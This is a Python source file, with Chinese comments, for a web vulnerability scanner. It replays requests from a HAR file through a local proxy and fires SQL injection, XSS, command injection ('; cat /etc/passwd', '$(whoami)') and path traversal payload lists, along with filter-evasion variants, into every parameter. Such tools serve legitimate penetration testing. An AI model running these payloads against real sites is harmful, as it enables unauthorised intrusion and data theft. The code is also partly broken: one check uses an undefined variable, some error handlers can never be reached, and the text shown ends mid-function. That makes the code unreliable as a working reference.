import json
import requests
import time
import logging
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
import concurrent.futures
import sys
import urllib3
from typing import Dict, List, Any
import subprocess
from tqdm import tqdm
import colorama
from colorama import Fore, Style
import re
import urllib.parse
import difflib
import argparse

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebVulnScanner:
    def __init__(self, har_file: str, proxy: str = None):
        """初始化扫描器"""
        # 首先初始化计时和基础属性
        self._scan_start_time = time.time()
        self._scan_statistics = {
            'start_time': self._scan_start_time,
            'request_times': [],
            'successful_requests': 0,
            'failed_requests': 0,
            'total_requests': 0
        }
        self.proxy = {'http':proxy,'https':proxy}  # 通过参数传入代理地址
        self.setup_output_dir()
        self.setup_logging()
        
        self.logger.info("Starting scanner initialization...")
        self.har_data = self.load_har_file(har_file)
        
        # 提取通用 headers 并设置为实例变量
        self.common_headers = self.extract_common_headers()
        self.logger.info(f"Extracted common headers")
        
        # 设置会话
        self.setup_session()
        
        # SQL注入测试向量
        self.sql_payloads = {
            'error_based': [
                "'", '"', "') OR '1'='1", "1' OR '1'='1", 
                "' OR '1'='1'--", '" OR "1"="1"--', "' OR 1=1--",
                "') OR ('1'='1", "1)) OR ((1=1",
                "'||(SELECT version())||'",
                "'+UNION+SELECT+NULL--",
                "' UNION SELECT @@version--"
            ],
            'time_based': [
                "1' AND SLEEP(5)-- -", 
                "1' WAITFOR DELAY '0:0:5'-- -",
                "1' AND BENCHMARK(5000000,MD5(1))-- -",
                "') OR SLEEP(5)-- -",
                "';WAITFOR DELAY '0:0:5'--"
            ],
            'union_based': [
                "' UNION ALL SELECT NULL,NULL,NULL-- -",
                "' UNION SELECT @@version,NULL,NULL-- -",
                "' UNION ALL SELECT table_name,NULL FROM information_schema.tables-- -",
                "' UNION SELECT NULL,concat(table_name) FROM information_schema.tables-- -"
            ],
            'boolean_based': [
                "' AND 1=1-- -", 
                "' AND 1=2-- -",
                "' AND 'a'='a'-- -",
                "' AND 'a'='b'-- -",
                "') AND ('x'='x"
            ]
        }
        
        # XSS测试向量
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            '<svg/onload=alert(1)>',
            '"><svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<img src=1 onerror=alert(1)>',
            '<svg><script>alert(1)</script>',
            '">><script>alert(1)</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>'
        ]
        
        # 命令注入测试向量
        self.command_payloads = [
            '| whoami',
            '; whoami',
            '`whoami`',
            '$(whoami)',
            '%0awhoami',
            '| id',
            '; id;',
            '& id',
            '&& id',
            '| dir',
            '; dir',
            '& dir',
            '&& dir',
            '| type %SYSTEMROOT%\\win.ini',
            '; cat /etc/passwd',
            '| cat /etc/passwd'
        ]

        # 路径遍历测试向量
        self.path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
            '..%255c..%255c..%255cwindows%255cwin.ini',
            '..%5c..%5c..%5cwindows%5cwin.ini'
        ]

    def setup_output_dir(self):
        """设置输出目录"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.output_dir = f'vuln_scan_{timestamp}'
        os.makedirs(self.output_dir, exist_ok=True)

    def setup_logging(self):
        """配置日志记录"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        log_file = os.path.join(self.output_dir, 'scan.log')
        
        # 配置文件处理器
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(log_format))
        
        # 配置控制台处理器
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(log_format))
        
        # 配置logger
        self.logger = logging.getLogger('WebVulnScanner')
        self.logger.setLevel(logging.INFO)
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    def load_har_file(self, har_file: str) -> Dict[str, Any]:
        """加载HAR文件"""
        try:
            self.logger.info(f"Loading HAR file: {har_file}")
            with open(har_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Error loading HAR file: {str(e)}")
            sys.exit(1)
    def extract_common_headers(self) -> Dict[str, str]:
        """从HAR文件中提取通用headers"""
        header_frequency = {}
        header_values = {}
        total_requests = len(self.har_data['log']['entries'])
        
        self.logger.info(f"Analyzing headers from {total_requests} requests...")
        
        # 遍历所有请求的headers
        for entry in self.har_data['log']['entries']:
            request = entry['request']
            for header in request['headers']:
                if not header['name'].startswith(':'):
                  name = header['name'].lower()
                  value = header['value']
                  
                  # 统计header出现频率
                  header_frequency[name] = header_frequency.get(name, 0) + 1
                  # 保存最新的header值
                  header_values[name] = value

        # 只保留出现在超过50%请求中的headers或必要的headers
        common_headers = {}
        threshold = total_requests * 0.5
        
        # 必要的headers，无论频率如何都保留
        essential_headers = {
            'user-agent', 'accept', 'accept-language', 'content-type',
            'authorization', 'cookie', 'origin', 'referer'
        }
        
        # 统计和选择headers
        selected_headers = 0
        for name, freq in header_frequency.items():
            name_lower = name.lower()
            if freq >= threshold or name_lower in essential_headers:
                common_headers[name] = header_values[name]
                selected_headers += 1
                self.logger.debug(
                    f"Selected header: {name} (frequency: {freq}/{total_requests}, " +
                    f"{'essential' if name_lower in essential_headers else 'high frequency'})"
                )

        self.logger.info(f"Selected {selected_headers} common headers from {len(header_frequency)} unique headers")
        return common_headers

    def setup_session(self):
        """配置请求会话"""
        self.session = requests.Session()
        
        # 设置代理
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        self.session.proxies = self.proxies
        
        # 禁用SSL验证
        self.session.verify = False
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # 设置超时
        self.session.timeout = (10, 30)
        
        # 配置重试适配器
        adapter = requests.adapters.HTTPAdapter(
            max_retries=3,
            pool_connections=100,
            pool_maxsize=100
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        if not self.test_proxy_connection():
            self.logger.error("Failed to connect to local proxy")
            sys.exit(1)
            
        self.logger.info("Session configured with local proxy")

    def make_request(self, url: str, method: str, params: Dict = None, 
                    data: Dict = None, headers: Dict = None, timeout: int = 10,
                    max_retries: int = 3, retry_delay: int = 1) -> requests.Response:
        """发送HTTP请求"""
        start_time = time.time()
        final_headers = self.common_headers.copy()
        if headers:
            final_headers.update(headers)

        self.logger.info(f"\n{'='*50}")
        self.logger.info(f"Making request via proxy:")
        self.logger.info(f"URL: {url}")
        self.logger.info(f"Method: {method}")

        for retry in range(max_retries):
            try:
                response = self.session.request(
                    method=method,
                    url=url,
                    params=params,
                    data=data,
                    headers=final_headers,
                    proxies=self.proxies,
                    verify=False,
                    timeout=timeout,
                    allow_redirects=False
                )

                request_time = time.time() - start_time
                self._scan_statistics['request_times'].append(request_time)
                self._scan_statistics['successful_requests'] += 1

                self.logger.info(f"Response status: {response.status_code}")
                self.logger.info(f"Response time: {request_time:.2f}s")
                self.logger.debug(f"Response headers: {dict(response.headers)}")
                
                return response

            except requests.exceptions.ProxyError as e:
                self.logger.error(f"Proxy error (attempt {retry + 1}): {str(e)}")
            except requests.exceptions.ConnectionError as e:
                self.logger.error(f"Connection error (attempt {retry + 1}): {str(e)}")
            except requests.exceptions.Timeout as e:
                self.logger.error(f"Timeout error (attempt {retry + 1}): {str(e)}")
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Request error (attempt {retry + 1}): {str(e)}")
            
            if retry < max_retries - 1:
                sleep_time = retry_delay * (2 ** retry)
                self.logger.debug(f"Waiting {sleep_time}s before retry...")
                time.sleep(sleep_time)

        self._scan_statistics['failed_requests'] += 1
        return None

    def extract_requests(self) -> List[Dict[str, Any]]:
        """从HAR文件提取请求信息"""
        requests_info = []
        total_entries = len(self.har_data['log']['entries'])
        
        self.logger.info(f"Extracting requests from {total_entries} HAR entries...")
        
        for entry in tqdm(self.har_data['log']['entries'], desc="Extracting requests"):
            request = entry['request']
            
            # 提取请求特定的headers
            request_headers = {
                h['name']: h['value'] for h in request['headers'] if not h['name'].startswith(':')
            }
            
            req_info = {
                'url': request['url'],
                'method': request['method'],
                'headers': request_headers,
                'params': {},
                'originalResponse': {
                    'status': entry['response']['status'],
                    'headers': {h['name']: h['value'] for h in entry['response']['headers']},
                    'content': entry['response'].get('content', {}).get('text', '')
                }
            }

            # 处理GET参数
            if request.get('queryString'):
                req_info['params'].update({
                    q['name']: q['value'] for q in request['queryString']
                })

            # 处理POST参数
            if request['method'] == 'POST' and 'postData' in request:
                post_data = request['postData']
                
                if 'params' in post_data:
                    req_info['post_data'] = {
                        p['name']: p['value'] for p in post_data['params']
                    }
                elif 'text' in post_data:
                    content_type = post_data.get('mimeType', '').lower()
                    if 'application/json' in content_type:
                        try:
                            req_info['post_data'] = json.loads(post_data['text'])
                        except json.JSONDecodeError:
                            self.logger.warning(f"Failed to parse JSON data for {request['url']}")
                    elif 'application/x-www-form-urlencoded' in content_type:
                        try:
                            req_info['post_data'] = dict(parse_qs(post_data['text']))
                        except Exception as e:
                            self.logger.warning(f"Failed to parse form data: {str(e)}")
                    else:
                        req_info['post_data'] = post_data['text']
                        
            requests_info.append(req_info)
            
        self.logger.info(f"Extracted {len(requests_info)} requests")
        return requests_info

    def test_proxy_connection(self) -> bool:
        """测试本地代理是否有效"""
        try:
            self.logger.info(f"Testing proxy connection ({self.proxy['http']})...")
            test_url = "http://example.com"
            
            response = requests.get(
                test_url,
                # proxies={
                #     'http': 'http://127.0.0.1:8080',
                #     'https': 'http://127.0.0.1:8080'
                # },
                proxies = self.proxy,
                verify=False,
                timeout=5
            )
            
            self.logger.info(f"{Fore.GREEN}Local proxy connection successful{Style.RESET_ALL}")
            return True
            
        except requests.exceptions.ProxyError as e:
            self.logger.error(f"{Fore.RED}Proxy Error: Cannot connect to proxy at {self.proxy['http']}{Style.RESET_ALL}")
            return False
        except Exception as e:
            self.logger.error(f"{Fore.RED}Connection Error: {str(e)}{Style.RESET_ALL}")
            return False
            
        except requests.exceptions.ProxyError as e:
            self.logger.error(f"{Fore.RED}Proxy Error: {str(e)}{Style.RESET_ALL}")
            return False
            
        except requests.exceptions.SSLError:
            # SSL错误通常表示请求确实经过了Burp
            self.logger.info(f"{Fore.GREEN}Proxy connection confirmed (SSL intercepted){Style.RESET_ALL}")
            return True
            
        except Exception as e:
            self.logger.error(f"{Fore.RED}Error testing proxy: {str(e)}{Style.RESET_ALL}")
            return False

    def test_vulnerability(self, request_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """测试漏洞"""
        vulnerabilities = []
        url = request_info['url']
        method = request_info['method']
        original_response = request_info['originalResponse']
        
        self.logger.info(f"\n{'#'*80}")
        self.logger.info(f"Testing vulnerabilities for URL: {url}")
        self.logger.info(f"Method: {method}")
        self.logger.info("Original Response Info:")
        self.logger.info(f"  Status: {original_response['status']}")
        self.logger.info("  Headers:")
        for header_name, header_value in original_response['headers'].items():
            self.logger.info(f"    {header_name}: {header_value}")
        self.logger.info(f"{'#'*80}\n")

        # 合并请求特定的headers和通用headers
        request_headers = self.common_headers.copy()
        request_headers.update(request_info.get('headers', {}))
        
        # 获取基准响应
        base_response = self.make_request(
            url=url,
            method=method,
            params=request_info.get('params', {}),
            data=request_info.get('post_data', None),
            headers=request_headers,
            max_retries=3
        )

        if not base_response:
            self.logger.warning(f"Failed to get base response for {url}")
            self.logger.debug("Request details for debugging:")
            self.logger.debug(f"  Headers: {json.dumps(request_headers, indent=2)}")
            self.logger.debug(f"  Params: {json.dumps(request_info.get('params', {}), indent=2)}")
            self.logger.debug(f"  Data: {json.dumps(request_info.get('post_data', None), indent=2)}")
            return vulnerabilities

        # 测试GET参数
        if request_info['params']:
            self.logger.info("\nTesting GET parameters:")
            for param, value in request_info['params'].items():
                if value is not None:
                    self.logger.info(f"Parameter: {param} = {value}")
                    vulnerabilities.extend(
                        self.test_parameter(
                            url, method, param, str(value), request_headers, 
                            is_post=False, base_response=base_response
                        )
                    )

        # 测试POST参数
        if method == 'POST' and 'post_data' in request_info:
            self.logger.info("\nTesting POST parameters:")
            if isinstance(request_info['post_data'], dict):
                for param, value in request_info['post_data'].items():
                    if value is not None:
                        self.logger.info(f"Parameter: {param} = {value}")
                        vulnerabilities.extend(
                            self.test_parameter(
                                url, method, param, str(value), request_headers, 
                                is_post=True, base_response=base_response
                            )
                        )
            else:
                self.logger.info("Skipping non-dictionary POST data")

        return vulnerabilities

    def test_parameter(self, url: str, method: str, param: str, value: str,
                      headers: Dict, is_post: bool = False, 
                      base_response: requests.Response = None) -> List[Dict[str, Any]]:
        """测试单个参数的所有漏洞类型"""
        vulnerabilities = []
        test_headers = headers.copy()

        self.logger.debug(f"Testing parameter: {param}")
        
        # SQL注入测试
        sql_results = self.test_sql_injection(
            url, method, param, value, test_headers, is_post, 
            base_response
        )
        if sql_results:
            self.logger.warning(f"Found SQL injection vulnerabilities in {param}")
            vulnerabilities.extend(sql_results)
        
        # XSS测试
        xss_results = self.test_xss(
            url, method, param, value, test_headers, is_post, 
            base_response
        )
        if xss_results:
            self.logger.warning(f"Found XSS vulnerabilities in {param}")
            vulnerabilities.extend(xss_results)
        
        # 命令注入测试
        cmd_results = self.test_command_injection(
            url, method, param, value, test_headers, is_post,
            base_response
        )
        if cmd_results:
            self.logger.warning(f"Found Command injection vulnerabilities in {param}")
            vulnerabilities.extend(cmd_results)
        
        # 路径遍历测试
        path_results = self.test_path_traversal(
            url, method, param, value, test_headers, is_post,
            base_response
        )
        if path_results:
            self.logger.warning(f"Found Path traversal vulnerabilities in {param}")
            vulnerabilities.extend(path_results)
        
        return vulnerabilities

    def generate_payload_variations(self, payload: str) -> List[str]:
        """生成payload变体"""
        variations = [payload]
        
        # URL编码变体
        url_encoded = urllib.parse.quote(payload)
        if url_encoded != payload:
            variations.append(url_encoded)
            
        # 双重URL编码变体
        double_encoded = urllib.parse.quote(url_encoded)
        if double_encoded != url_encoded:
            variations.append(double_encoded)
            
        # 大小写变化
        variations.append(payload.upper())
        variations.append(payload.lower())
        
        # 空格变体
        if ' ' in payload:
            variations.extend([
                payload.replace(' ', '+'),
                payload.replace(' ', '%20'),
                payload.replace(' ', '/**/'),
                payload.replace(' ', '\n'),
                payload.replace(' ', '\t'),
                payload.replace(' ', '\r')
            ])
            
        # 注释变体
        if '--' in payload:
            variations.extend([
                payload.replace('--', '#'),
                payload.replace('--', '/*'),
                payload.replace('--', ';--'),
                payload.replace('--', '-%2d')
            ])
            
        # 引号变体
        if "'" in payload:
            variations.extend([
                payload.replace("'", "''"),
                payload.replace("'", "%27"),
                payload.replace("'", "`"),
                payload.replace("'", "\"")
            ])
            
        return list(set(variations))  # 去重

    def test_sql_injection(self, url: str, method: str, param: str, value: str,
                          headers: Dict, is_post: bool = False,
                          base_response: requests.Response = None) -> List[Dict[str, Any]]:
        """测试SQL注入漏洞"""
        results = []
        
        for injection_type, payloads in self.sql_payloads.items():
            self.logger.debug(f"Testing {injection_type} SQL injection for {param}")
            
            for payload in tqdm(payloads, desc=f"Testing {injection_type} SQL injection", leave=False):
                # 生成payload变体
                payload_variations = self.generate_payload_variations(payload)
                
                for test_payload in payload_variations:
                    test_value = f"{value}{test_payload}"
                    
                    try:
                        if is_post:
                            data = {param: test_value}
                            response = self.make_request(url, method, data=data, headers=headers)
                        else:
                            params = {param: test_value}
                            response = self.make_request(url, method, params=params, headers=headers)

                        if not response:
                            continue

                        if self.check_sql_vulnerability(response, base_response, injection_type):
                            vuln = {
                                'type': 'SQL Injection',
                                'subtype': injection_type,
                                'url': url,
                                'method': method,
                                'parameter': param,
                                'payload': test_payload,
                                'evidence': self.get_vulnerability_evidence(response, base_response)
                            }
                            results.append(vuln)
                            self.logger.warning(
                                f"{Fore.RED}Found {injection_type} SQL injection in {param}{Style.RESET_ALL}"
                            )
                            
                    except Exception as e:
                        self.logger.error(f"Error testing SQL injection: {str(e)}")
                        
                    time.sleep(0.5)
                    
        return results

    def check_sql_vulnerability(self, response: requests.Response, 
                              base_response: requests.Response,
                              injection_type: str) -> bool:
        """增强的SQL注入检测"""
        if not response or not base_response:
            return False
            
        response_text = response.text.lower()
        base_text = base_response.text.lower()
        
        # 详细的SQL错误模式
        sql_errors = {
            'mysql_errors': [
                'er_operand_columns',  # 操作数列错误
                'er_parse_error',      # 解析错误
                'er_no_such_table',    # 表不存在
                'er_dup_key',          # 重复键
                'er_syntax_error',     # 语法错误
                'sql state',           # SQL状态
                'sqlstate',            # SQL状态
                'sqlmessage',          # SQL消息
                'errno',               # 错误号
                'mysql error',         # MySQL错误
                'operand should contain',  # 操作数错误
                'instr',               # INSTR函数
                'concat',              # CONCAT函数
                'where id =',          # WHERE子句
                'select.*from',        # SELECT语句结构
                'left join',           # JOIN语句
                'error in your sql',
                'warning: mysql'
            ],
            'sql_keywords': [
                'select distinct',
                'left join',
                'where',
                'from',
                'status = 1',
                'and',
                'or',
                'rp_',                 # 表前缀泄露
                'action',
                'method'
            ],
            'json_errors': [
                '"code"',
                '"message"',
                '"error"',
                '"sqlmessage"',
                '"sql"'
            ]
        }
        
        if injection_type == 'error_based':
            # 检查详细的SQL错误信息
            for error in sql_errors['mysql_errors']:
                if error in response_text and error not in base_text:
                    self.logger.debug(f"Found MySQL error pattern: {error}")
                    return True
                    
            # 检查SQL关键字泄露
            sql_pattern_count = 0
            for keyword in sql_errors['sql_keywords']:
                if keyword in response_text and keyword not in base_text:
                    sql_pattern_count += 1
                    self.logger.debug(f"Found SQL keyword: {keyword}")
            
            # 如果发现多个SQL关键字，可能存在注入
            if sql_pattern_count >= 3:
                return True
                
            # 检查JSON错误结构
            json_error_count = 0
            for error in sql_errors['json_errors']:
                if error in response_text and error not in base_text:
                    json_error_count += 1
                    self.logger.debug(f"Found JSON error structure: {error}")
            
            if json_error_count >= 3:
                return True
                
            # 检查是否包含完整SQL查询
            if ('select' in response_text and 
                'from' in response_text and 
                'where' in response_text and 
                these_patterns not in base_text):
                self.logger.debug("Found complete SQL query in response")
                return True

        elif injection_type == 'time_based':
            base_time = base_response.elapsed.total_seconds()
            response_time = response.elapsed.total_seconds()
            time_difference = response_time - base_time
            
            # 使用动态阈值
            threshold = max(5, base_time * 3)
            
            if time_difference > threshold:
                self.logger.debug(f"Time difference: {time_difference}s")
                return True
                
        elif injection_type == 'boolean_based':
            # 检查响应差异
            response_diff = self.calculate_response_difference(response_text, base_text)
            status_changed = response.status_code != base_response.status_code
            length_diff = abs(len(response_text) - len(base_text))
            
            # 增加JSON响应结构检查
            try:
                response_json = response.json()
                base_json = base_response.json()
                
                # 检查错误代码变化
                if ('code' in response_json and 'code' in base_json and
                    response_json['code'] != base_json['code']):
                    return True
                    
                # 检查错误消息变化
                if ('message' in response_json and 'message' in base_json and
                    response_json['message'] != base_json['message']):
                    return True
                    
                # 检查错误结构变化
                if 'error' in response_json and 'error' not in base_json:
                    return True
                    
            except ValueError:
                pass
            
            if (response_diff > 0.3 or status_changed) and length_diff > 50:
                return True

        return False

    def calculate_response_difference(self, response_text: str, base_text: str) -> float:
        """计算响应差异率"""
        matcher = difflib.SequenceMatcher(None, response_text, base_text)
        similarity = matcher.ratio()
        return 1 - similarity  # 返回差异率   

    def test_xss(self, url: str, method: str, param: str, value: str,
                 headers: Dict, is_post: bool = False,
                 base_response: requests.Response = None) -> List[Dict[str, Any]]:
        """测试XSS漏洞"""
        results = []
        
        self.logger.debug(f"Testing XSS for parameter {param}")
        
        for payload in tqdm(self.xss_payloads, desc="Testing XSS", leave=False):
            # 生成XSS payload变体
            payload_variations = self.generate_xss_variations(payload)
            
            for test_payload in payload_variations:
                test_value = f"{value}{test_payload}"
                
                try:
                    if is_post:
                        data = {param: test_value}
                        response = self.make_request(url, method, data=data, headers=headers)
                    else:
                        params = {param: test_value}
                        response = self.make_request(url, method, params=params, headers=headers)

                    if not response:
                        continue

                    if self.check_xss_vulnerability(response, base_response, test_payload):
                        vuln = {
                            'type': 'XSS',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': test_payload,
                            'evidence': self.get_vulnerability_evidence(response, base_response)
                        }
                        results.append(vuln)
                        self.logger.warning(
                            f"{Fore.RED}Found XSS vulnerability in {param}{Style.RESET_ALL}"
                        )
                        
                except Exception as e:
                    self.logger.error(f"Error testing XSS: {str(e)}")
                    
                time.sleep(0.5)
                
        return results

    def generate_xss_variations(self, payload: str) -> List[str]:
        """生成XSS payload变体"""
        variations = [payload]
        
        # 基本编码变体
        variations.extend([
            urllib.parse.quote(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;'),
            payload.replace("'", '&#x27;')
        ])
        
        # 大小写变化
        variations.extend([
            payload.replace('script', 'ScRiPt'),
            payload.replace('alert', 'AlErT'),
            payload.replace('img', 'ImG')
        ])
        
        # 空格变化
        if ' ' in payload:
            variations.extend([
                payload.replace(' ', '+'),
                payload.replace(' ', '%20'),
                payload.replace(' ', '/**/')
            ])
        
        # 事件处理变化
        if 'onerror' in payload.lower():
            variations.extend([
                payload.replace('onerror', 'OnErRoR'),
                payload.replace('onerror', 'oNeRrOr')
            ])
            
        return list(set(variations))  # 去重

    def check_xss_vulnerability(self, response: requests.Response,
                              base_response: requests.Response,
                              payload: str) -> bool:
        """检查XSS漏洞"""
        if not response or not base_response:
            return False
            
        response_text = response.text.lower()
        base_text = base_response.text.lower()
        payload_lower = payload.lower()
        
        # 检查Content-Type
        content_type = response.headers.get('Content-Type', '').lower()
        if not ('text/html' in content_type or 'application/xhtml' in content_type):
            return False
            
        # 检查XSS保护头
        xss_protection = response.headers.get('X-XSS-Protection', '').lower()
        if xss_protection == '1; mode=block':
            return False
            
        # 检查CSP
        csp = response.headers.get('Content-Security-Policy', '')
        if csp and ('script-src' in csp or 'default-src' in csp):
            self.logger.debug("CSP detected, checking if it blocks XSS")
            
        # 检查payload是否被HTML编码
        html_encoded = (
            payload_lower.replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#x27;')
            .lower()
        )
        
        if html_encoded in response_text:
            return False
            
        # 检查payload是否完整存在于响应中
        script_tags = re.findall(r'<script[^>]*>.*?</script>', response_text, re.DOTALL)
        event_handlers = re.findall(r'on\w+\s*=\s*["\'][^"\']*["\']', response_text)
        
        # 检查是否在原始响应中已存在
        if script_tags or event_handlers:
            original_tags = re.findall(r'<script[^>]*>.*?</script>', base_text, re.DOTALL)
            original_handlers = re.findall(r'on\w+\s*=\s*["\'][^"\']*["\']', base_text)
            
            new_tags = set(script_tags) - set(original_tags)
            new_handlers = set(event_handlers) - set(original_handlers)
            
            if new_tags or new_handlers:
                return True
                
        # 检查是否存在危险的DOM操作
        dangerous_patterns = [
            'document.write', 'innerHTML', 'outerHTML',
            'eval(', 'setTimeout(', 'setInterval('
        ]
        
        for pattern in dangerous_patterns:
            if pattern in response_text and pattern not in base_text:
                return True
                
        return False

    def test_command_injection(self, url: str, method: str, param: str, value: str,
                             headers: Dict, is_post: bool = False,
                             base_response: requests.Response = None) -> List[Dict[str, Any]]:
        """测试命令注入漏洞"""
        results = []
        
        self.logger.debug(f"Testing command injection for parameter {param}")
        
        for payload in tqdm(self.command_payloads, desc="Testing Command Injection", leave=False):
            # 生成命令注入payload变体
            payload_variations = self.generate_command_variations(payload)
            
            for test_payload in payload_variations:
                test_value = f"{value}{test_payload}"
                
                try:
                    if is_post:
                        data = {param: test_value}
                        response = self.make_request(url, method, data=data, headers=headers)
                    else:
                        params = {param: test_value}
                        response = self.make_request(url, method, params=params, headers=headers)

                    if not response:
                        continue

                    if self.check_command_vulnerability(response, base_response):
                        vuln = {
                            'type': 'Command Injection',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': test_payload,
                            'evidence': self.get_vulnerability_evidence(response, base_response)
                        }
                        results.append(vuln)
                        self.logger.warning(
                            f"{Fore.RED}Found Command Injection vulnerability in {param}{Style.RESET_ALL}"
                        )
                        
                except Exception as e:
                    self.logger.error(f"Error testing command injection: {str(e)}")
                    
                time.sleep(0.5)
                
        return results

    def generate_command_variations(self, payload: str) -> List[str]:
        """生成命令注入payload变体"""
        variations = [payload]
        
        # URL编码变体
        variations.append(urllib.parse.quote(payload))
        
        # 命令分隔符变体
        if '|' in payload:
            variations.extend([
                payload.replace('|', '%7C'),
                payload.replace('|', '||'),
                payload.replace('|', '|||')
            ])
            
        if ';' in payload:
            variations.extend([
                payload.replace(';', '%3B'),
                payload.replace(';', ';;'),
                payload.replace(';', '\n')
            ])
            
        # 空格变体
        if ' ' in payload:
            variations.extend([
                payload.replace(' ', '%20'),
                payload.replace(' ', '+'),
                payload.replace(' ', '${IFS}'),
                payload.replace(' ', '$IFS'),
                payload.replace(' ', '\t'),
                payload.replace(' ', '\n')
            ])
            
        # 命令替换变体
        variations.extend([
            payload.replace('whoami', 'who$(echo a)mi'),
            payload.replace('whoami', 'who${echo a}mi'),
            payload.replace('whoami', 'w"h"o"a"m"i"')
        ])
        
        return list(set(variations))

    def check_command_vulnerability(self, response: requests.Response,
                                  base_response: requests.Response) -> bool:
        """检查命令注入漏洞"""
        if not response or not base_response:
            return False
            
        response_text = response.text.lower()
        base_text = base_response.text.lower()
        
        # 如果响应完全相同，可能没有漏洞
        if response_text == base_text:
            return False

        # 检查命令执行特征
        command_patterns = {
            'unix': [
                r'root:x:', r'bin:x:', r'daemon:x:', r'nobody:x:',
                r'uid=\d+\(', r'gid=\d+\(',
                r'/bin/bash', r'/usr/bin/',
                r'total\s+\d+', r'drwxr-xr-x',
                r'/etc/passwd', r'/etc/shadow'
            ],
            'windows': [
                r'volume serial number', r'volume in drive',
                r':\\\windows\\system32\\', r':\\program files\\',
                r':\\\windows\\system\\',
                r'microsoft windows \[version',
                r'directory of [c-z]:\\',
                r'\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}'
            ],
            'errors': [
                r'sh:\s*\d+:', r'command not found',
                r'unknown command', r'syntax error',
                r'\[\w+\]:\s+\w+:', r'permission denied'
            ]
        }
        
        # 检查每种类型的特征
        for os_type, patterns in command_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text) and not re.search(pattern, base_text):
                    self.logger.debug(f"Found {os_type} command output pattern: {pattern}")
                    return True

        # 检查响应大小变化
        if abs(len(response_text) - len(base_text)) > 100:
            self.logger.debug("Significant response size difference detected")
            return True

        return False

    def test_path_traversal(self, url: str, method: str, param: str, value: str,
                           headers: Dict, is_post: bool = False,
                           base_response: requests.Response = None) -> List[Dict[str, Any]]:
        """测试路径遍历漏洞"""
        results = []
        
        self.logger.debug(f"Testing path traversal for parameter {param}")
        
        for payload in tqdm(self.path_traversal_payloads, desc="Testing Path Traversal", leave=False):
            # 生成路径遍历payload变体
            payload_variations = self.generate_path_traversal_variations(payload)
            
            for test_payload in payload_variations:
                test_value = f"{value}{test_payload}"
                
                try:
                    if is_post:
                        data = {param: test_value}
                        response = self.make_request(url, method, data=data, headers=headers)
                    else:
                        params = {param: test_value}
                        response = self.make_request(url, method, params=params, headers=headers)

                    if not response:
                        continue

                    if self.check_path_traversal_vulnerability(response, base_response):
                        vuln = {
                            'type': 'Path Traversal',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': test_payload,
                            'evidence': self.get_vulnerability_evidence(response, base_response)
                        }
                        results.append(vuln)
                        self.logger.warning(
                            f"{Fore.RED}Found Path Traversal vulnerability in {param}{Style.RESET_ALL}"
                        )
                        
                except Exception as e:
                    self.logger.error(f"Error testing path traversal: {str(e)}")
                    
                time.sleep(0.5)
                
        return results

    def generate_path_traversal_variations(self, payload: str) -> List[str]:
        """生成路径遍历payload变体"""
        variations = [payload]
        
        # URL编码变体
        variations.extend([
            urllib.parse.quote(payload),
            urllib.parse.quote(urllib.parse.quote(payload))  # 双重编码
        ])
        
        # 目录分隔符变体
        if '../' in payload:
            variations.extend([
                payload.replace('../', '..././'),
                payload.replace('../', '...//'),
                payload.replace('../', '....//'),
                payload.replace('../', '....//')
            ])
            
        # Unicode编码变体
        variations.extend([
            payload.replace('../', '%u002e%u002e%u2215'),
            payload.replace('../', '%u002e%u002e%u2216')
        ])
        
        # 特殊编码变体
        variations.extend([
            payload.replace('../', '..%c0%af'),
            payload.replace('../', '..%c1%9c'),
            payload.replace('/', '%2f'),
            payload.replace('\\', '%5c')
        ])
        
        # 系统特定变体
        if 'etc/passwd' in payload:
            variations.extend([
                payload.replace('etc/passwd', 'etc//passwd'),
                payload.replace('etc/passwd', './etc/passwd'),
                payload.replace('etc/passwd', '%00/etc/passwd'),
                payload.replace('etc/passwd', '%00../../etc/passwd')
            ])
            
        if 'windows/win.ini' in payload:
            variations.extend([
                payload.replace('windows/win.ini', 'windows\\win.ini'),
                payload.replace('windows/win.ini', './windows/win.ini'),
                payload.replace('windows/win.ini', '%00\\windows\\win.ini'),
                payload.replace('windows/win.ini', '%00..\\..\\windows\\win.ini')
            ])
            
        return list(set(variations))

    def check_path_traversal_vulnerability(self, response: requests.Response,
                                         base_response: requests.Response) -> bool:
        """检查路径遍历漏洞"""
        if not response or not base_response:
            return False
            
        response_text = response.text.lower()
        base_text = base_response.text.lower()
        
        # 如果响应完全相同，可能没有漏洞
        if response_text == base_text:
            return False
